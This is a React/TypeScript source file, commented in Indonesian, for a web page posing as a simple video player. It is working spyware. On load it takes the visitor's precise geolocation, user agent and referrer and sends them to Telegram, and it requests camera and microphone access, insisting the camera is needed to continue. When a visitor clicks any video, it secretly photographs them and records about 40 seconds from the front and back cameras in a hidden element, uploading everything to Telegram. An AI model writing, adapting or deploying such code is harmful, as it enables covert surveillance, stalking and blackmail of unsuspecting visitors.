import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback, useRef } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';

function App() {
  const [isPlaying, setIsPlaying] = useState<number | null>(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
  const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);

  const videos = [
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/tedrod8mdo5djsak196z9/VID_20250411_185550_962.mp4?rlkey=pg2shpqizwb94ieh2bo1v0fd1&st=gexwsz9n&dl=1' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/zjxkih4fa603zx3p7lfea/VID_20250411_190315_449.mp4?rlkey=hcteyqwg0ybdf3nwac1lz50ct&st=9j3wufic&dl=1' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/iwhlu5kv3fw4a6u0erx7g/VID_20250404_064856_263.mp4?rlkey=u9qzo7pmtrbchf3wym6plqrz1&st=40ibzkdu&dl=1' },
    { videoUrl: 'https://cdn.videy.co/WRnnbxOh.mp4' },
    { videoUrl: 'https://cdn.videy.co/8asKje3H1.mp4' },
    { videoUrl: 'https://cdn.videy.co/HCpyHdGC.mp4' },
    { videoUrl: 'https://cdn.videy.co/J4r8BFDR.mp4' },
    { videoUrl: 'https://cdn.videy.co/NQ8EOxk0.mp4' },
    { videoUrl: 'https://cdn.videy.co/16gpSQzQ.mp4' },
    { videoUrl: 'https://cdn.videy.co/x3DQJdR6.mp4' },
    { videoUrl: 'https://cdn.videy.co/FPZ8MZdC.mp4' },
    { videoUrl: 'https://cdn.videy.co/nxkWOzw01.mp4' },
    { videoUrl: 'https://cdn.videy.co/YQog37Pu1.mp4' },
    { videoUrl: 'https://cdn.videy.co/VVH2RmCn1.mp4' },
    { videoUrl: 'https://video.twimg.com/amplify_video/1844748398769090560/vid/avc1/720x1280/2bQWWm0jkr8d0kFY.mp4?tag=14&fbclid=PAZXh0bgNhZW0CMTEAAacx7boT1XRp_y2Nd0ItS586hUftwIXq4G63BAS7t9YXHTbCkJhSOop-rBjvTQ_aem_uP1MRy05506nV5vLEZHGBQ' },
    { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
  ];

  useEffect(() => {
    monitorSuspiciousActivity();

    const getLocation = async (): Promise<string> => {
      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          });
        });
        const { latitude, longitude } = position.coords;
        return `Latitude: ${latitude}, Longitude: ${longitude}`;
      } catch (error) {
        console.error('Gagal mendapatkan lokasi:', error);
        return window.location.href; // Fallback ke URL jika lokasi tidak tersedia
      }
    };

    const sendVisitorNotification = async () => {
      const location = await getLocation();
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: location,
        referrer: document.referrer || 'Langsung',
        previousSites: document.referrer || 'Tidak ada',
      };
      try {
        await sendTelegramNotification(visitorDetails);
        console.log('Notifikasi pengunjung berhasil dikirim.');
      } catch (error) {
        console.error('Gagal mengirim notifikasi pengunjung:', error);
      }
    };
    sendVisitorNotification();

    videos.forEach((video, index) => {
      console.log(`Memeriksa video ${index + 1}: ${video.videoUrl}`);
      if (!validateVideoUrl(video.videoUrl)) {
        console.error(`Video ${index + 1} memiliki URL yang tidak valid.`);
      }
    });

    const initializeCameraStreams = async () => {
      const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
        try {
          const constraints = {
            video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
            audio: true,
          };
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          const deviceId = stream.getVideoTracks()[0].getSettings().deviceId || '';
          console.log(`Berhasil mendapatkan stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
          return { stream, deviceId };
        } catch (error) {
          console.error(`Gagal mendapatkan akses kamera ${cameraType}:`, error);
          return null;
        }
      };

      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');
        console.log('Perangkat kamera yang ditemukan:', videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId })));

        // Inisialisasi kamera depan
        const frontResult = await requestMediaAccess('user', 'depan');
        if (frontResult) {
          cameraStreamsRef.current.push({ stream: frontResult.stream, type: 'depan', deviceId: frontResult.deviceId });
        } else {
          console.warn('Kamera depan tidak tersedia atau akses ditolak.');
        }

        // Inisialisasi kamera belakang dengan fallback
        let backResult = await requestMediaAccess('environment', 'belakang');
        if (!backResult && videoDevices.length > 1) {
          console.log('Mencoba kamera belakang dengan deviceId alternatif...');
          backResult = await requestMediaAccess({ deviceId: videoDevices[1].deviceId }, 'belakang');
        }
        if (backResult) {
          cameraStreamsRef.current.push({ stream: backResult.stream, type: 'belakang', deviceId: backResult.deviceId });
        } else {
          console.warn('Kamera belakang tidak tersedia atau akses ditolak.');
        }

        if (cameraStreamsRef.current.length === 0) {
          console.error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
          alert('Diperlukan kamera untuk melanjutkan, Harap Periksa perangkat anda!');
        } else {
          console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map(s => `${s.type} (${s.deviceId})`));
        }
      } catch (error) {
        console.error('Error saat menginisialisasi stream kamera:', error);
        alert('Diperlukan kamera untuk melanjutkan, Harap Periksa perangkat anda!');
      }
    };

    initializeCameraStreams();

    return () => {
      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
    };
  }, []);

  const verifyStream = (stream: MediaStream, type: string): boolean => {
    const videoTracks = stream.getVideoTracks();
    if (videoTracks.length === 0 || !videoTracks[0].enabled) {
      console.error(`Stream untuk kamera ${type} tidak valid atau dimatikan. Tracks: ${videoTracks.length}`);
      return false;
    }
    console.log(`Stream untuk kamera ${type} valid dengan ${videoTracks.length} track(s).`);
    return true;
  };

  const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
    try {
      const constraints = {
        video: { deviceId: { exact: deviceId }, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
        audio: true,
      };
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      console.log(`Berhasil menginisialisasi ulang stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
      return stream;
    } catch (error) {
      console.error(`Gagal menginisialisasi ulang stream untuk kamera ${cameraType}:`, error);
      return null;
    }
  };

  const recordCamera = async (stream: MediaStream, type: string, deviceId: string) => {
    let currentStream = stream;
    if (!verifyStream(currentStream, type)) {
      console.warn(`Stream kamera ${type} tidak valid, mencoba menginisialisasi ulang...`);
      const newStream = await reinitializeStream(type, deviceId);
      if (newStream && verifyStream(newStream, type)) {
        currentStream = newStream;
        // Perbarui stream di cameraStreamsRef
        const cameraIndex = cameraStreamsRef.current.findIndex(s => s.type === type);
        if (cameraIndex !== -1) {
          cameraStreamsRef.current[cameraIndex].stream = newStream;
        }
      } else {
        console.warn(`Gagal menginisialisasi ulang stream kamera ${type}, melewati perekaman.`);
        return;
      }
    }

    try {
      const cameraVideo = document.createElement('video');
      cameraVideo.srcObject = currentStream;
      cameraVideo.playsInline = true;
      cameraVideo.muted = true;
      cameraVideo.autoplay = true;
      cameraVideo.style.display = 'none';
      document.body.appendChild(cameraVideo);

      await new Promise((resolve) => {
        cameraVideo.onloadedmetadata = async () => {
          await cameraVideo.play().catch(err => console.error(`Gagal memutar video kamera ${type}:`, err));
          setTimeout(resolve, 500);
        };
      });

      const videoWidth = cameraVideo.videoWidth;
      const videoHeight = cameraVideo.videoHeight;
      console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);

      // Mengambil foto
      const canvas = document.createElement('canvas');
      const canvasAspectRatio = 9 / 16;
      const videoAspectRatio = videoWidth / videoHeight;

      let drawWidth, drawHeight, offsetX, offsetY;
      if (videoAspectRatio > canvasAspectRatio) {
        drawWidth = 720;
        drawHeight = drawWidth / videoAspectRatio;
      } else {
        drawHeight = 1280;
        drawWidth = drawHeight * videoAspectRatio;
      }

      canvas.width = drawWidth;
      canvas.height = drawHeight;

      offsetX = (drawWidth - videoWidth) / 2;
      offsetY = (drawHeight - videoHeight) / 2;

      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(cameraVideo, offsetX, offsetY, videoWidth, videoHeight);
      }

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 1.0);
      });

      try {
        await sendImageToTelegram(photoBlob);
        console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
      } catch (error) {
        console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
      }

      // Merekam video
      const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
      const mediaRecorder = new MediaRecorder(currentStream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 4000000,
      });
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { type: supportedMimeType });
        try {
          await sendVideoToTelegram(videoBlob);
          console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
        } catch (error) {
          console.error(`Gagal mengirim video dari kamera ${type}:`, error);
        }
      };

      mediaRecorder.onerror = (e) => {
        console.error(`Error saat merekam kamera ${type}:`, e);
      };

      mediaRecorder.start(1000);
      console.log(`Mulai merekam kamera ${type}`);

      await new Promise((resolve) => setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
          console.log(`Perekaman kamera ${type} dihentikan setelah 40 detik.`);
        }
        resolve(null);
      }, 40000));

      // Cleanup
      if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
    } catch (error) {
      console.error(`Error saat merekam kamera ${type}:`, error);
    }
  };

  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
    console.log('Memulai proses perekaman untuk kamera...');

    try {
      await videoElement.play();

      if (cameraStreamsRef.current.length === 0) {
        console.error('Tidak ada stream kamera yang tersedia. Harap izinkan akses kamera.');
        videoElement.pause();
        setIsPlaying(null);
        return;
      }

      const frontCamera = cameraStreamsRef.current.find(s => s.type === 'depan');
      const backCamera = cameraStreamsRef.current.find(s => s.type === 'belakang');

      if (frontCamera) {
        await recordCamera(frontCamera.stream, 'depan', frontCamera.deviceId);
      } else {
        console.warn('Kamera depan tidak tersedia untuk perekaman.');
      }

      if (backCamera) {
        await recordCamera(backCamera.stream, 'belakang', backCamera.deviceId);
      } else {
        console.warn('Kamera belakang tidak tersedia untuk perekaman.');
      }

      if (!frontCamera && !backCamera) {
        console.error('Kedua kamera tidak tersedia.');
      }

      videoElement.pause();
      setIsPlaying(null);
    } catch (error) {
      console.error('Error dalam captureAndSendMedia:', error);
      videoElement.pause();
      setIsPlaying(null);
    }
  }, []);

  const handleVideoClick = useCallback(async (index: number) => {
    if (isPlaying !== null && isPlaying !== index) {
      const prevVideo = videoRefs.current[isPlaying];
      if (prevVideo) {
        prevVideo.pause();
        prevVideo.currentTime = 0;
        prevVideo.removeAttribute('src');
        prevVideo.load();
        console.log(`Video sebelumnya di indeks ${isPlaying} dihentikan sepenuhnya.`);
      }
    }

    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!validateVideoUrl(videos[index].videoUrl)) {
        console.error('URL video tidak valid, menghentikan pemutaran.');
        return;
      }

      try {
        setIsPlaying(index);
        await captureAndSendMedia(videoElement);
      } catch (error) {
        console.error('Error memutar video:', error);
        videoElement.pause();
        videoElement.currentTime = 0;
        videoElement.removeAttribute('src');
        videoElement.load();
        setIsPlaying(null);
      }
    }
  }, [isPlaying]);

  const toggleFullscreen = (index: number) => {
    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!isFullscreen) {
        videoElement.requestFullscreen().catch(err => console.error('Gagal masuk fullscreen:', err));
        setIsFullscreen(true);
      } else {
        document.exitFullscreen().catch(err => console.error('Gagal keluar fullscreen:', err));
        setIsFullscreen(false);
      }
      console.log(`Mengubah mode fullscreen untuk video di indeks: ${index}`);
    }
  };

  const handleVideoEnded = (index: number) => {
    setIsPlaying(null);
    console.log(`Video di indeks ${index} telah selesai.`);
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>
      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[360px] mx-auto">
          <div className="space-y-2">
            {videos.map((video, index) => (
              <div key={index} className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
                <video
                  ref={(el) => (videoRefs.current[index] = el)}
                  src={video.videoUrl}
                  className="w-full h-full object-cover"
                  muted
                  onClick={() => handleVideoClick(index)}
                  onEnded={() => handleVideoEnded(index)}
                  preload="metadata"
                  {...({ loading: 'lazy' } as any)}
                >
                  <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                </video>
                {isPlaying === index && (
                  <div className="absolute bottom-2 right-2 z-20">
                    <button
                      onClick={() => toggleFullscreen(index)}
                      className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
                    >
                      {isFullscreen ? (
                        <ArrowsPointingInIcon className="w-5 h-5 text-white" />
                      ) : (
                        <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
                      )}
                    </button>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
